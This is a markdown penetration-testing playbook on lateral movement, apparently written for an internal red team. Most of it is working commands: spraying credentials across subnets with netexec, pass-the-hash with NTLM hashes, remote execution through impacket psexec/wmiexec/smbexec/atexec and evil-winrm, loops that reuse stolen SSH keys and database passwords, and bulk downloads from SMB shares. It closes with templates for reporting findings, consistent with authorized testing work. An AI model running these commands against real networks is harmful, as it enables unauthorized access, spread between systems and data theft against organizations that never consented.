# Lateral Movement - Moving Between Systems

**Purpose:** ONLY techniques for moving from compromised system to other systems. Assumes you have credentials from credential hunting.

**Prerequisites:** 
- At least one compromised system
- Credentials found (from reconnaissance, exploitation, or cred hunting)

---

## Credential Testing Workflow

### Test Credentials Systematically

**You found: `admin:AdminPass123!`**

**Test it on ALL services:**
```bash
PASSWORD="AdminPass123!"

# SSH (all Linux hosts)
netexec ssh 10.10.10.0/24 -u admin -p "$PASSWORD"
netexec ssh 10.10.10.0/24 -u root -p "$PASSWORD"

# SMB (all Windows hosts)
netexec smb 10.10.10.0/24 -u admin -p "$PASSWORD"
netexec smb 10.10.10.0/24 -u administrator -p "$PASSWORD"

# WinRM
netexec winrm 10.10.10.0/24 -u administrator -p "$PASSWORD"

# MSSQL
netexec mssql 10.10.10.0/24 -u sa -p "$PASSWORD"

# MySQL
mysql -h 10.10.10.0/24 -u root -p"$PASSWORD"
# RDP
netexec rdp 10.10.10.0/24 -u administrator -p "$PASSWORD"
```

**Track results:**

---

## SSH Lateral Movement

### With Passwords

```bash
# Test SSH on all discovered Linux hosts
netexec ssh 10.10.10.0/24 -u username -p 'PASSWORD'
```

### With SSH Keys

```bash
# Use found/stolen keys
chmod 600 stolen_key
ssh -i stolen_key username@TARGET

# Test key on multiple hosts
for ip in $(cat linux_hosts.txt); do
    ssh -i stolen_key -o ConnectTimeout=3 username@$ip "hostname" 2>/dev/null && echo "Key works on $ip"
done
```

---

## SMB/Windows Lateral Movement

### With Passwords

```bash
# Find admin access
netexec smb 10.10.10.0/24 -u username -p 'PASSWORD'

# "Pwn3d!" = local admin rights
netexec smb 10.10.10.0/24 -u administrator -p 'PASSWORD' | grep "Pwn3d"

# Try as local admin (non-domain)
netexec smb 10.10.10.0/24 -u administrator -p 'PASSWORD' --local-auth
```

### With NTLM Hashes (Pass-the-Hash)

```bash
# Test hash across network
netexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH

# Look for admin access
netexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH | grep "Pwn3d"
```

### With Kerberos Tickets

```bash
# Use Kerberos authentication
impacket-psexec DOMAIN/Administrator@TARGET -k -no-pass
```

---

## Remote Code Execution Methods

### Windows Remote Execution

**PSExec (requires local admin):**
```bash
# With password
impacket-psexec DOMAIN/username:password@TARGET

# With hash
impacket-psexec -hashes :NTLM_HASH username@TARGET
```

**WMIExec (stealthier):**
```bash
# Doesn't write to disk
impacket-wmiexec DOMAIN/username:password@TARGET
```

**Evil-WinRM (if WinRM enabled):**
```bash
# With password
evil-winrm -i TARGET -u username -p 'password'

# With hash
evil-winrm -i TARGET -u username -H NTLM_HASH
```

**SMBExec:**
```bash
impacket-smbexec DOMAIN/username:password@TARGET
```

**AtExec (scheduled task):**
```bash
# Single command execution
impacket-atexec DOMAIN/username:password@TARGET "whoami"
```

### Linux Remote Execution

**SSH:**
```bash
# Single command
ssh user@TARGET "whoami"

# Interactive shell
ssh user@TARGET

# With key
ssh -i key user@TARGET
```

---

## Database Lateral Movement

### MySQL/MariaDB

```bash
# Test credentials on all MySQL servers
for ip in $(cat mysql_hosts.txt); do
    echo "[*] Testing $ip"
    mysql -h $ip -u root -p'PASSWORD' -e "SELECT version();" 2>/dev/null && echo "Access on $ip!"
done

# Connect to target
mysql -h TARGET -u root -p'PASSWORD'
```

### MSSQL

```bash
# Test credentials
netexec mssql 10.10.10.0/24 -u sa -p 'PASSWORD'

# Connect to accessible server
impacket-mssqlclient DOMAIN/username:password@TARGET
```

### PostgreSQL

```bash
# Test credentials
for ip in $(cat postgres_hosts.txt); do
    psql -h $ip -U postgres -W >/dev/null 2>&1 && echo "Access on $ip!"
done
```

---

## Share Access and File Servers

### SMB Shares

```bash
# List accessible shares
netexec smb TARGET -u username -p 'password' --shares

# Connect to share
smbclient //TARGET/ShareName -U "username%password"

# Mount share
sudo mount -t cifs //TARGET/share /mnt/smb -o user=username,password=password

# Download all files from share
smbget -R smb://TARGET/share -U username%password
```

### NFS Shares

```bash
# Mount discovered NFS export
sudo mount -t nfs TARGET:/export /mnt/nfs -o nolock

# Browse contents
ls -la /mnt/nfs/
```

---

## Password Reuse Patterns

### Common Reuse Scenarios

**Database password found in web config:**
```
DbPassYYYY! often works as:
- SSH password (same username or root)
- sudo password (if you have shell as that user)
- Other database passwords
- Windows local admin password
```

**User password found anywhere:**
```
Test as:
- Same user on other systems
- Root password (people reuse!)
- Admin password (Windows)
- Service account password
```

**SSH key found:**
```
Test on:
- All SSH services in network
- Same username on all Linux boxes
- Root user (sometimes same key)
```

---

## Active Directory Lateral Movement

### With Domain Credentials

**Find where you have access:**
```bash
# SMB access across domain
netexec smb 10.10.10.0/24 -u DOMAIN_USER -p 'PASSWORD'

# Local admin access
netexec smb 10.10.10.0/24 -u DOMAIN_USER -p 'PASSWORD' | grep "Pwn3d"

# WinRM access
netexec winrm 10.10.10.0/24 -u DOMAIN_USER -p 'PASSWORD'
```

### Pass-the-Hash

**With dumped NTLM hashes:**
```bash
# Test hash on all systems
netexec smb 10.10.10.0/24 -u Administrator -H NTLM_HASH

# Execute on systems where you have admin
impacket-psexec -hashes :NTLM_HASH Administrator@TARGET
```

### Service Account Lateral Movement

**After Kerberoasting:**
```bash
# Service account often has admin on specific servers
# Test the cracked password:
netexec smb 10.10.10.0/24 -u sqlsvc -p 'CrackedPassword!'
netexec mssql 10.10.10.0/24 -u sqlsvc -p 'CrackedPassword!'

# Common pattern: SQL service account has admin on SQL servers
```

---

## Lateral Movement Workflow

### Standard Process 

**Step 1: Gather all credentials**
- From current system
- From team shared database
- From previous compromises

**Step 2: Test systematically**
- SSH on all Linux hosts
- SMB on all Windows hosts
- Databases on all DB servers
- WinRM/RDP on Windows

**Step 3: Document results**
- Update team with credentials
- Mark newly accessible systems
- Prioritize for exploitation

**Step 4: Execute on new targets**
- Move to new system
- Begin post-exploitation on that system
- Repeat the cycle

---

## When to Create Findings

**Lateral movement itself isn't always a finding, but document:**

**Password Reuse (MEDIUM):**
- Title: "Credential Reuse Across Multiple Systems"
- Impact: "Single compromised credential provides access to N systems"

**Weak Segmentation (MEDIUM):**
- Title: "Insufficient Network Segmentation"  
- Impact: "Compromised DMZ host provides access to internal network"

**Service Account Over-Privileged (HIGH):**
- Title: "Service Account Has Excessive Administrative Rights"
- Impact: "Single service account has admin on N servers"

---
